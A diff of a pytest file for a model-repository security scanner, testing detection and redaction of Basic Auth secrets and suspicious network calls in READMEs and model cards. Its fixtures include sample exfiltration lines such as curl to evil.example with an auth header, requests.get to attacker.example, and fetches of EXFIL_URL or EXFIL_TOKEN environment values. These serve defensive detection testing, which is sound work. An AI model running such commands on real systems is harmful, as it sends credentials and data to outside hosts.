@@ -1,18 +1,29 @@
+import json
 from pathlib import Path
 from typing import Any
 
 import pytest
 
+import modelaudit.scanners.text_scanner as text_scanner_module
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
+from modelaudit.detectors import network_comm
 from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
 from modelaudit.scanners.text_scanner import (
-    MAX_DOCUMENTATION_FENCE_MARKERS,
+    MAX_TEXT_FINDING_CONTEXT_BYTES,
     MAX_TOKENIZER_VOCABULARY_CC_RETARGET_OCCURRENCES,
     TextScanner,
 )
 from modelaudit.utils.helpers import cache_decorator
+
+
+def _failed_network_detection_checks(result: Any) -> list[Any]:
+    return [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
 
 
 def test_text_scanner_handles_routable_vocabulary_file(tmp_path: Path) -> None:
@@ -95,6 +106,273 @@ def test_text_scanner_routes_localized_documentation_through_security_detectors(
     )
 
 
+def test_text_scanner_tokenizer_readme_basic_links_not_basic_auth_secret(tmp_path: Path) -> None:
+    text_path = tmp_path / "audio_tokenizer" / "README.md"
+    text_path.parent.mkdir()
+    text_path.write_text("Provide the basic links for the model\n", encoding="utf-8")
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+
+    assert result.success is True
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert any(
+        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.PASSED for check in result.checks
+    )
+
+
+def test_text_scanner_detects_valid_authorization_basic_credentials(tmp_path: Path) -> None:
+    text_path = tmp_path / "headers.txt"
+    text_path.write_text("Authorization: Basic dXNlcjpwYXNz\n", encoding="utf-8")
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert failed_secret_checks
+    assert failed_secret_checks[0].rule_code == "S702"
+    assert failed_secret_checks[0].details["redacted_value"] == "Basic <redacted>"
+
+
+@pytest.mark.parametrize(
+    ("filename", "content"),
+    [
+        (".env", "HTTP_AUTHORIZATION=Basic ZW52LXVzZXI6cGFzcw==\n"),
+        ("prod.env", "BASIC_AUTH=Basic cHJvZC1lbnY6cGFzcw==\n"),
+        ("README.md", 'BASIC_AUTH="Basic YmFzaWMtZW52OnBhc3M="\n'),
+        ("README.md", 'auth_header = "Basic YXV0aC1oZWFkZXI6cGFzcw=="\n'),
+        ("README.md", ("x" * 1000) + " Authorization: Basic bG9uZy1saW5lOnBhc3M=\n"),
+        ("model_card.md", 'payload = "{\\"Authorization\\": \\"Basic ZXNjYXBlZC1jcmxmOnBhc3M=\\r\\n\\"}"\n'),
+        ("model_card.md", "Use `Authorization: Basic c2VudGVuY2U6cGFzcw==.` for the endpoint.\n"),
+    ],
+)
+def test_text_scanner_detects_basic_auth_env_aliases_and_sentence_punctuation(
+    tmp_path: Path, filename: str, content: str
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+    routed = scan_file(str(text_path), config={"cache_scan_results": False, "check_network_comm": False})
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False, check_network_comm=False)
+
+    assert TextScanner.can_handle(str(text_path))
+    assert result.success is False
+    assert routed.scanner_name == "text"
+    assert routed.success is False
+    assert determine_exit_code(aggregate) == 1
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.rule_code == "S702"
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+        and check.details.get("redacted_value") == "Basic <redacted>"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_model_card_code_block_detects_escaped_basic_auth_header(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    token = "ZXNjYXBlZC1tb2RlbGNhcmQ6cGFzcw=="
+    text_path.write_text(
+        f'```python\npayload = "{{\\"Authorization\\": \\"Basic {token}\\"}}"\n```\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert result.success is False
+    assert failed_secret_checks
+    assert failed_secret_checks[0].rule_code == "S702"
+    assert failed_secret_checks[0].details["redacted_value"] == "Basic <redacted>"
+    assert token not in json.dumps(failed_secret_checks[0].details, sort_keys=True)
+
+
+def test_text_scanner_executable_basic_auth_header_stays_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "```sh\ncurl -H 'Authorization: Basic dXNlcjpwYXNz' https://evil.example/payload\n```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.rule_code == "S702"
+        and check.details.get("redacted_value") == "Basic <redacted>"
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("url") == "https://evil.example/payload"
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        '```python\nAUTH_HEADER = f"Authorization: Basic cHktZnN0cmluZzpwYXNz"\n```\n',
+        '```python\nAUTH_HEADER = b"Authorization: Basic cHktYnl0ZXM6cGFzcw=="\n```\n',
+        "```javascript\nconst auth = `Authorization: Basic anMtdGVtcGxhdGU6cGFzcw==`;\n```\n",
+        '```Dockerfile\nENV AUTH_HEADER="Authorization: Basic ZG9ja2VyLWVudjpwYXNz"\n```\n',
+        '```yaml\nenv:\n- name: AUTH_HEADER\n  value: "Authorization: Basic azhzLWVudjpwYXNz"\n```\n',
+    ],
+)
+def test_text_scanner_executable_basic_auth_literals_stay_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False, check_network_comm=False)
+
+    assert result.success is False
+    assert determine_exit_code(aggregate) == 1
+    assert any(
+        check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.rule_code == "S702"
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+        and check.details.get("redacted_value") == "Basic <redacted>"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_basic_auth_does_not_bind_far_away_token(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "Authorization: Basic\n" + ("padding\n" * 300) + "ZmFyLWF3YXk6cGFzcw==\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_network_comm": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False, check_network_comm=False)
+
+    assert result.success is True
+    assert determine_exit_code(aggregate) == 0
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+
+
+def test_text_scanner_url_userinfo_is_redacted_without_basic_auth_false_positive(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('download = "https://user:pass@example.test/model.bin"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("url") == "https://example.test/model.bin"
+        for check in result.checks
+    )
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    serialized = result.to_json()
+    assert "user:pass" not in serialized
+    assert "pass@example" not in serialized
+
+
+def test_text_scanner_basic_auth_finding_limit_redacts_tokens_and_fails_closed(tmp_path: Path) -> None:
+    text_path = tmp_path / "headers.txt"
+    text_path.write_text(
+        "\n".join(
+            [
+                "Authorization: Basic dTA6cA==",
+                "Authorization: Basic dTE6cA==",
+                "Authorization: Basic dTI6cA==",
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    result = TextScanner(
+        config={
+            "check_network_comm": False,
+            "text_content_max_findings": 2,
+        }
+    ).scan(str(text_path))
+
+    failed_secret_checks = [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+    assert len(failed_secret_checks) == 2
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("detector") == "secrets"
+        and check.details.get("max_findings") == 2
+        for check in result.checks
+    )
+    serialized = result.to_json()
+    for raw_value in ("u0:p", "u1:p", "u2:p", "dTA6cA==", "dTE6cA==", "dTI6cA=="):
+        assert raw_value not in serialized
+
+
+@pytest.mark.integration
+def test_omnivoice_pinned_audio_tokenizer_readme_basic_links_not_basic_auth_secret(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setenv("PROMPTFOO_DISABLE_TELEMETRY", "1")
+    monkeypatch.setenv("NO_ANALYTICS", "1")
+    from modelaudit.utils.sources.huggingface import download_file_from_hf
+
+    url = (
+        "https://huggingface.co/k2-fsa/OmniVoice/resolve/"
+        "999c332499c708b116876ff5fe1aa5dd15f422ce/audio_tokenizer/README.md"
+    )
+    downloaded_path = Path(download_file_from_hf(url, cache_dir=tmp_path / "hf", max_size=1024 * 1024))
+
+    assert "Provide the basic links for the model" in downloaded_path.read_text(encoding="utf-8")
+    result = TextScanner(config={"check_network_comm": False}).scan(str(downloaded_path))
+
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Embedded Secrets Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("secret_type") == "Basic Auth Credentials"
+    ]
+
+
 @pytest.mark.parametrize(
     "filename",
     [
@@ -135,6 +413,60 @@ def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> No
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
+@pytest.mark.parametrize("filename", ["README.md", "model_card"])
+def test_text_scanner_documentation_package_version_is_not_an_ipv4_endpoint(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text("```bash\npip install opencv-python-headless==4.11.0.86\n```\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "ipv4_address"
+        and check.details.get("ip") == "4.11.0.86"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    ("filename", "content", "finding_type"),
+    [
+        ("README.md", "```bash\npip install https://4.11.0.86/package.whl\n```\n", "url_detected"),
+        (
+            "README.md",
+            "```bash\npip install package==4.11.0.86\ncurl https://4.11.0.86/payload\n```\n",
+            "ipv4_address",
+        ),
+        ("LICENSE.md", "```bash\npip install package==4.11.0.86\n```\n", "ipv4_address"),
+    ],
+)
+def test_text_scanner_documentation_package_version_near_matches_remain_actionable(
+    tmp_path: Path,
+    filename: str,
+    content: str,
+    finding_type: str,
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == finding_type
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 @pytest.mark.parametrize("filename", ["model_card.txt", "modelcard.md"])
 def test_text_scanner_model_card_aliases_preserve_executable_network_findings(
     tmp_path: Path,
@@ -157,96 +489,6 @@ def test_text_scanner_model_card_aliases_preserve_executable_network_findings(
     assert determine_exit_code(aggregate) == 1
 
 
-@pytest.mark.parametrize("filename", ["README", "README.txt", "model_card"])
-def test_text_scanner_ambiguous_fenced_documentation_is_informational(tmp_path: Path, filename: str) -> None:
-    text_path = tmp_path / filename
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-@pytest.mark.parametrize("filename", ["README", "model_card"])
-def test_text_scanner_extensionless_bare_tilde_fenced_documentation_is_informational(
-    tmp_path: Path,
-    filename: str,
-) -> None:
-    text_path = tmp_path / filename
-    text_path.write_text(
-        """~~~
-git clone https://github.com/example-org/model.git
-~~~
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_crlf_fenced_documentation_is_informational(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_bytes(b"```bash\r\ngit clone https://github.com/example-org/model.git\r\n```\r\n")
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-@pytest.mark.parametrize(
-    ("opening_fence", "expected_exit_code"),
-    [
-        ("```bash", 0),
-        ("```py`thon", 1),
-    ],
-)
-def test_text_scanner_backtick_fence_info_string_requires_valid_markdown(
-    tmp_path: Path,
-    opening_fence: str,
-    expected_exit_code: int,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        f"{opening_fence}\ngit clone https://github.com/example-org/model.git\n```\n",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert determine_exit_code(aggregate) == expected_exit_code
-    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues) == (
-        expected_exit_code == 1
-    )
-
-
-def test_text_scanner_late_fenced_documentation_stays_informational(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        ("```python\npass\n```\n" * 1024) + "```bash\ngit clone https://github.com/example-org/model.git\n```\n"
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
 @pytest.mark.parametrize("filename", ["model_card.txt", "modelcard.md"])
 def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
     tmp_path: Path,
@@ -262,3079 +504,1279 @@ def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
     assert determine_exit_code(aggregate) == 0
 
 
-def test_text_scanner_fenced_documentation_network_indicators_are_informational(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-pip install opencv-python-headless==4.11.0.86
-git clone https://github.com/SandAI-org/MagiAttention.git
-```
-```yaml
-api_url: http://127.0.0.1:8080/v1/chat/completions
-artifact_url: s3://model-bucket/path/model.bin
-```
-```yaml
-c2_research_reference: https://c2.example/payload
-```
-""",
-        encoding="utf-8",
-    )
+def test_text_scanner_model_card_deduplicates_shared_cloud_url_evidence(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("Files: [model](https://huggingface.co/datasets/trivia_qa)\n", encoding="utf-8")
 
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-    informational_types = {
-        check.details.get("type")
-        for check in result.checks
-        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
+    first_result = TextScanner().scan(str(text_path))
+    second_result = TextScanner().scan(str(text_path))
+
+    first_check = _failed_network_detection_checks(first_result)
+    second_check = _failed_network_detection_checks(second_result)
+    assert len(first_check) == len(second_check) == 1
+    details = first_check[0].details
+    assert first_check[0].severity == IssueSeverity.INFO
+    assert details["type"] == "cloud_storage_url"
+    assert details["line"] == 1
+    assert details["column"] == len("Files: [model](") + 1
+    assert details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://huggingface.co/datasets/trivia_qa",
+    }
+    assert details["evidence_fingerprint"] == second_check[0].details["evidence_fingerprint"]
+    assert {finding["type"] for finding in details["deduplicated_related_findings"]} == {
+        "domain_name",
+        "url_detected",
     }
 
-    assert {"domain_name", "url_detected"} <= informational_types
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
 
+def test_text_scanner_model_card_evidence_column_counts_unicode_characters(tmp_path: Path) -> None:
+    prefix = "Résumé files: [model]("
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(f"{prefix}https://huggingface.co/datasets/trivia_qa)\n", encoding="utf-8")
 
-def test_text_scanner_fenced_documentation_loopback_api_request_is_informational(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl http://localhost:8080/v1/embeddings \\
-  -H "Content-Type: application/json" \\
-  -d '{"input": "This is an example sentence"}'
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_loopback_api_client_is_informational(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import urllib.request
-
-req = urllib.request.Request("http://127.0.0.1:8080/v1/chat/completions")
-return urllib.request.urlopen(req).read()
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    informational_types = {
-        check.details.get("type")
-        for check in result.checks
-        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
-    }
-    assert {"network_function", "network_library", "url_detected"} <= informational_types
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_imported_urlopen_loopback_api_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-from urllib.request import urlopen
-
-urlopen("http://localhost:8080/v1/models")
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/models"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-@pytest.mark.parametrize(
-    "request_options",
-    [
-        'data=os.environ["EXFIL_TOKEN"].encode()',
-        'method="POST"',
-    ],
-)
-def test_text_scanner_fenced_documentation_request_active_options_remain_actionable(
-    tmp_path: Path,
-    request_options: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        f"""```python
-import os
-import urllib.request
-
-req = urllib.request.Request(
-    "http://images.cocodataset.org/val2017/000000039769.jpg",
-    {request_options},
-)
-urllib.request.urlopen(req)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://images.cocodataset.org/val2017/000000039769.jpg"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-@pytest.mark.parametrize(
-    "api_url",
-    [
-        "http://user:pass@localhost:8080/v1/embeddings",
-        "http://localhost:8080/v1/embeddings?token=secret",
-    ],
-)
-def test_text_scanner_fenced_documentation_loopback_api_rejects_sensitive_urls(
-    tmp_path: Path,
-    api_url: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        f"""```python
-import requests
-
-requests.get("{api_url}")
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_suspicious_port_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl http://localhost:4444/v1/payload
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "suspicious_port"
-        and check.details.get("port") == 4444
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_fetch_is_informational(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python3
-from PIL import Image
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-image = Image.open(requests.get(url, stream=True).raw)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    informational_types = {
-        check.details.get("type")
-        for check in result.checks
-        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
-    }
-    assert {"network_function", "network_library", "url_detected"} <= informational_types
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_direct_passive_media_fetch_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python3
-from PIL import Image
-import requests
-
-image = Image.open(requests.get("http://images.cocodataset.org/val2017/000000039769.jpg").raw)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    informational_types = {
-        check.details.get("type")
-        for check in result.checks
-        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
-    }
-    assert {"network_function", "network_library", "url_detected"} <= informational_types
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_multiline_passive_media_fetch_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python3
-from PIL import Image
-import requests
-
-image = Image.open(requests.get(
-    "http://images.cocodataset.org/val2017/000000039769.jpg",
-    stream=True,
-).raw)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    informational_types = {
-        check.details.get("type")
-        for check in result.checks
-        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
-    }
-    assert {"network_function", "network_library", "url_detected"} <= informational_types
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_imported_passive_media_fetch_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python3
-from PIL import Image
-from requests import get
-
-image = Image.open(get("http://images.cocodataset.org/val2017/000000039769.jpg").raw)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    informational_types = {
-        check.details.get("type")
-        for check in result.checks
-        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
-    }
-    assert {"network_library", "url_detected"} <= informational_types
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-@pytest.mark.parametrize(
-    "media_url",
-    [
-        "https://user:pass@example.com/image.jpg",
-        "https://example.com/image.jpg?api_key=secret",
-    ],
-)
-def test_text_scanner_fenced_documentation_passive_media_rejects_sensitive_urls(
-    tmp_path: Path,
-    media_url: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        f"""```python
-from PIL import Image
-import requests
-
-url = "{media_url}"
-image = Image.open(requests.get(url, stream=True).raw)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_rejects_arbitrary_hosts(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-from PIL import Image
-import requests
-
-image = Image.open(requests.get("https://attacker.example/track.jpg").raw)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_suspicious_port_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-requests.get("https://images.cocodataset.org:4444/x.jpg")
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "suspicious_port"
-        and check.details.get("port") == 4444
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_active_call(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python3
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-requests.get(url, stream=True)
-requests.get("https://evil.example/payload")
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_aliased_fetch(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-fetch = requests.get
-fetch(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
